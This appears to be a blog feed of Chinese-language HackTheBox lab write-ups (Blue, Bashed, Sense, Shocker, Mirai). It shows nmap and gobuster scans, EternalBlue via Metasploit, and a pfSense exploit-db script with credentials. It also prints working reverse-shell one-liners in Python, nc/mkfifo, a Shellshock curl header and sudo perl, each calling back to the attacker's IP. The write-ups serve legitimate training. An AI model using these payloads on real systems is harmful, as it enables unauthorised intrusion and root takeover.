    <content type="html"><![CDATA[<p>第一台windows靶机，对windows渗透还是比较陌生<a id="more"></a></p><img src="/2021/03/12/blue-hackthebox/5.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.40</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/blue 10.10.10.40</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Fri Mar 12 09:57:01 2021 as: nmap -v -sC -sV -oA nmap/blue 10.10.10.40</span></span><br><span class="line">Nmap scan report for 10.10.10.40</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 36s, deviation: 2s, median: 35s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: haris-PC</span><br><span class="line">|   NetBIOS computer name: HARIS-PC\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-03-12T01:59:32+00:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|<span class="emphasis">_  message_</span>signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-03-12T01:59:31</span><br><span class="line">|<span class="emphasis">_  start_</span>date: 2021-03-12T01:54:31</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Fri Mar 12 09:59:09 2021 -- 1 IP address (1 host up) scanned in 128.09 seconds</span></span><br></pre></td></tr></table></figure><p>开放的端口有不少，靶机叫blue，可能跟永恒之蓝有关系，刚好445端口又是开放的，那就用nmap扫一下445端口，看看有没有存在的漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 445 --script=vuln 10.10.10.40</span><br></pre></td></tr></table></figure><img src="/2021/03/12/blue-hackthebox/1.png" class=""><p>扫到了一个高危漏洞，可以用ms17010打</p><h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><img src="/2021/03/12/blue-hackthebox/2.png" class=""><p>由于不知道windows版本，所以用上面不带版本号的永恒之蓝漏洞来攻击</p><img src="/2021/03/12/blue-hackthebox/3.png" class=""><p>修改<code>lhost</code>和<code>rhost</code>就可以了</p><img src="/2021/03/12/blue-hackthebox/4.png" class=""><p>弹回了shell，接着就是比较简单了，因为直接是最高权限了，就不用提权了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一台windows靶机，对windows渗透还是比较陌生
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>bashed-hackthebox</title>
    <link href="http://yoursite.com/2021/03/10/bashed-hackthebox/"/>
    <id>http://yoursite.com/2021/03/10/bashed-hackthebox/</id>
    <published>2021-03-10T07:20:16.000Z</published>
    <updated>2021-03-10T08:27:05.322Z</updated>
    
    <content type="html"><![CDATA[<p>python文件里的输出归属于root，因此python文件是以root权限在运行<a id="more"></a></p><img src="/2021/03/10/bashed-hackthebox/1.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.68</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/bashed 10.10.10.68</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Wed Mar 10 10:07:31 2021 as: nmap -v -sC -sV -oA nmap/bashed 10.10.10.68</span></span><br><span class="line">Nmap scan report for 10.10.10.68</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Arrexel's Development Site</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Wed Mar 10 10:07:48 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds</span></span><br></pre></td></tr></table></figure><p>只扫到一个80端口，可以访问一下网站</p><img src="/2021/03/10/bashed-hackthebox/2.png" class=""><p>就是一个phpbash的考点估计，爆破一下路径</p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster/bashed  -x php</span><br></pre></td></tr></table></figure><img src="/2021/03/10/bashed-hackthebox/3.png" class=""><p><code>/config.php</code>访问是空白界面</p><p><code>/dev</code>路径下有两个文件，打开是bash终端</p><img src="/2021/03/10/bashed-hackthebox/4.png" class=""><p>反弹shell到本地</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.38",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure><img src="/2021/03/10/bashed-hackthebox/5.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先通过<code>sudo -l</code>查看sudo的权限，这里看到<code>www-data</code>不需要输入密码可以切换到<code>scriptmanager</code>用户</p><img src="/2021/03/10/bashed-hackthebox/6.png" class=""><p>查找属于<code>scriptmanager</code>用户的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / ! -path <span class="string">"/proc/*"</span> -user scriptmanager -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><img src="/2021/03/10/bashed-hackthebox/7.png" class=""><p><code>/scripts</code>文件夹属于<code>scriptmanager</code>用户，看一下</p><img src="/2021/03/10/bashed-hackthebox/8.png" class=""><p>test.txt属于root用户，test.txt文本内容来自于test.py，这说明test.py是root用户在运行，尝试向test.py中写入反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line">import os;os.system(<span class="string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.38 4444 &gt;/tmp/f'</span>)</span><br></pre></td></tr></table></figure><p>接着监听端口，等待几十秒收到了shell，是root的权限</p><p>查看一下定时任务</p><img src="/2021/03/10/bashed-hackthebox/9.png" class=""><p>可以看到会定时运行<code>/scripts</code>下所有的python文件，所以能接收到shell</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python文件里的输出归属于root，因此python文件是以root权限在运行
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>sense-hackthebox</title>
    <link href="http://yoursite.com/2021/03/09/sense-hackthebox/"/>
    <id>http://yoursite.com/2021/03/09/sense-hackthebox/</id>
    <published>2021-03-09T10:22:46.000Z</published>
    <updated>2021-03-09T13:20:25.808Z</updated>
    
    <content type="html"><![CDATA[<p>pfsense漏洞利用（不是唯一办法）<a id="more"></a></p><img src="/2021/03/09/sense-hackthebox/6.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.60</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/sense 10.10.10.60</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Tue Mar  9 17:52:39 2021 as: nmap -v -sC -sV -oA nmap/sense 10.10.10.60</span></span><br><span class="line">Nmap scan report for 10.10.10.60</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT    STATE SERVICE    VERSION</span><br><span class="line">80/tcp  open  http       lighttpd 1.4.35</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to https://10.10.10.60/</span><br><span class="line">443/tcp open  ssl/https?</span><br><span class="line">| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US</span><br><span class="line">| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 1024</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2017-10-14T19:21:35</span><br><span class="line">| Not valid after:  2023-04-06T19:21:35</span><br><span class="line">| MD5:   65f8 b00f 57d2 3468 2c52 0f44 8110 c622</span><br><span class="line">|_SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Tue Mar  9 17:53:27 2021 -- 1 IP address (1 host up) scanned in 48.44 seconds</span></span><br></pre></td></tr></table></figure><p>80端口和443端口都是web服务端口</p><img src="/2021/03/09/sense-hackthebox/1.png" class=""><p>看到是有关pfsense的界面，那么应该漏洞点就是这个了，但是只知道有关pfsense，详细的版本等信息没有拿到，下面进行路径爆破</p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.60 -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-lowercase-2.3-medium.txt -o gobuster&#x2F;sense -x php,txt -t 200 -s 200,204,302,307,401,403</span><br></pre></td></tr></table></figure><p>爆破不出来路径，看了wp，应该是有一个<code>system-users.txt</code></p><img src="/2021/03/09/sense-hackthebox/2.png" class=""><p>文档里给了提示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:Rohit</span><br><span class="line">password:company defaults//默认密码</span><br></pre></td></tr></table></figure><p><a href="https://docs.netgate.com/pfsense/en/latest/usermanager/defaults.html" target="_blank" rel="noopener">默认账户密码</a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><img src="/2021/03/09/sense-hackthebox/3.png" class=""><p>pfsense的版本是2.1.3，searchexploit模块查询一下漏洞</p><img src="/2021/03/09/sense-hackthebox/4.png" class=""><p>这个python的脚本可以反弹shell，查看一下脚本具体使用</p><img src="/2021/03/09/sense-hackthebox/5.png" class=""><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/exploitdb/exploits/php/webapps/43560.py --rhost 10.10.10.60 --lhost 10.10.14.38 --lport 9001 --username rohit --password pfsense</span><br></pre></td></tr></table></figure><img src="/2021/03/09/sense-hackthebox/7.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pfsense漏洞利用（不是唯一办法）
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>shocker-hackthebox</title>
    <link href="http://yoursite.com/2021/03/09/shocker-hackthebox/"/>
    <id>http://yoursite.com/2021/03/09/shocker-hackthebox/</id>
    <published>2021-03-09T03:58:28.000Z</published>
    <updated>2021-03-09T12:09:32.167Z</updated>
    
    <content type="html"><![CDATA[<p>perl提权<a id="more"></a></p><img src="/2021/03/09/shocker-hackthebox/7.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.56</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/shocker 10.10.10.56</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Tue Mar  9 10:12:20 2021 as: nmap -v -sC -sV -oA nmap/shocker 10.10.10.56</span></span><br><span class="line">Increasing send delay for 10.10.10.56 from 0 to 5 due to 24 out of 78 dropped probes since last increase.</span><br><span class="line">Nmap scan report for 10.10.10.56</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)</span><br><span class="line">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)</span><br><span class="line">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Tue Mar  9 10:13:38 2021 -- 1 IP address (1 host up) scanned in 77.99 seconds</span></span><br></pre></td></tr></table></figure><p>80——web服务</p><p>2222——openssh7.2p2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchexploit openssh</span><br></pre></td></tr></table></figure><img src="/2021/03/09/shocker-hackthebox/1.png" class=""><p>能找到openssh7.2p2用户枚举的漏洞，但是并没有太大的用处，接下来进行路径爆破</p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.56 -w /usr/share/dirb/wordlists/small.txt -o gobuster/shocker</span><br></pre></td></tr></table></figure><img src="/2021/03/09/shocker-hackthebox/2.png" class=""><p>爆破出了一个路径，<code>/cgi-bin</code>,无法访问，通常这个文件夹会是apache存储shell文件之类的，继续爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/dirb/wordlists/small.txt -o gobuster/shockers -x sh,pl</span><br></pre></td></tr></table></figure><img src="/2021/03/09/shocker-hackthebox/3.png" class=""><p>存在<code>user.sh</code>，访问<code>/cgi-bin/user.sh</code>可下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">user.sh</span></span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">Just an uptime test script</span><br><span class="line"></span><br><span class="line"> 00:28:59 up  3:19,  0 users,  load average: 0.00, 0.00, 0.00</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>google搜索cgi-bin和shell相关的，锁定shellchock</p><p><a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="noopener">文章</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H "user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.38/9002 0&gt;&amp;1'" http://10.10.10.56/cgi-bin/user.sh</span><br></pre></td></tr></table></figure><img src="/2021/03/09/shocker-hackthebox/4.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>sudo -l</code>查看sudo权限，发现通过perl可以直接提权</p><img src="/2021/03/09/shocker-hackthebox/5.png" class=""><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.38";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></pre></td></tr></table></figure><img src="/2021/03/09/shocker-hackthebox/6.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;perl提权
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>mirai-hackthebox</title>
    <link href="http://yoursite.com/2021/03/08/mirai-hackthebox/"/>
    <id>http://yoursite.com/2021/03/08/mirai-hackthebox/</id>
    <published>2021-03-08T15:59:35.000Z</published>
    <updated>2021-03-08T16:45:23.959Z</updated>
    
    <content type="html"><![CDATA[<p>z找回已删除的文件，没有接触过的知识点，user权限比较无语，树莓派<a id="more"></a></p><img src="/2021/03/08/mirai-hackthebox/11.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.38</span><br><span class="line">靶机：10.10.10.48</span><br></pre></td></tr></table></figure><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/mirai 10.10.10.48</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Tue Mar  9 00:07:53 2021 as: nmap -v -sC -sV -oA nmap/mirai 10.10.10.48</span></span><br><span class="line">Nmap scan report for 10.10.10.48</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)</span><br><span class="line">|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)</span><br><span class="line">|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)</span><br><span class="line">|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)</span><br><span class="line">53/tcp   open     domain  dnsmasq 2.76</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: dnsmasq-2.76</span><br><span class="line">80/tcp   open     http    lighttpd 1.4.35</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span><br><span class="line">2170/tcp filtered eyetv</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Tue Mar  9 00:09:50 2021 -- 1 IP address (1 host up) scanned in 116.99 seconds</span></span><br></pre></td></tr></table></figure><p>几个常见的端口，没什么信息，爆破一下路径</p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.48  -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster/mirai</span><br></pre></td></tr></table></figure><img src="/2021/03/08/mirai-hackthebox/1.png" class=""><p>有个<code>/admin</code>路径，访问，等一会跳转</p><img src="/2021/03/08/mirai-hackthebox/2.png" class=""><p>有个登录，尝试弱密码，失败</p><p>这里是猜测的账户和密码，既然叫Pi-hole，又是树莓派，全称是raspberry pi，尝试pi为用户名，raspberry为密码ssh连接，成功</p><img src="/2021/03/08/mirai-hackthebox/3.png" class=""><h3 id="user权限"><a href="#user权限" class="headerlink" title="user权限"></a>user权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name user.txt</span><br></pre></td></tr></table></figure><p>在<code>/home/pi/Desktop/</code>路径下面</p><img src="/2021/03/08/mirai-hackthebox/4.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>sudo -l查看sudo的权限</p><img src="/2021/03/08/mirai-hackthebox/5.png" class=""><p>可以看到pi可以执行sudo且并不需要密码，那就可以直接切换root权限</p><img src="/2021/03/08/mirai-hackthebox/6.png" class=""><p>在读取root.txt的时候，发现了文件里的内容提示</p><img src="/2021/03/08/mirai-hackthebox/7.png" class=""><p>说文件在usb的设备里面，来看一下usb设备里存储的文件</p><img src="/2021/03/08/mirai-hackthebox/8.png" class=""><p>提示说文件被删除了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df -lh //查看磁盘占用情况</span><br><span class="line">mount//查看挂载文件</span><br></pre></td></tr></table></figure><img src="/2021/03/08/mirai-hackthebox/9.png" class=""><p>找到了挂载的文件和占用磁盘内存的文件，<code>/dev/sdb</code></p><p>通过strings来查看文件中的字符串文本</p><img src="/2021/03/08/mirai-hackthebox/10.png" class=""><p>成功拿到了记录里的root.txt内容</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>学习到了之前没怎么用过的linux’命令</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;z找回已删除的文件，没有接触过的知识点，user权限比较无语，树莓派
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>blocky-hackthebox</title>
    <link href="http://yoursite.com/2021/03/08/blocky-hackthebox/"/>
    <id>http://yoursite.com/2021/03/08/blocky-hackthebox/</id>
    <published>2021-03-08T06:08:31.000Z</published>
    <updated>2021-03-08T15:13:19.529Z</updated>
    
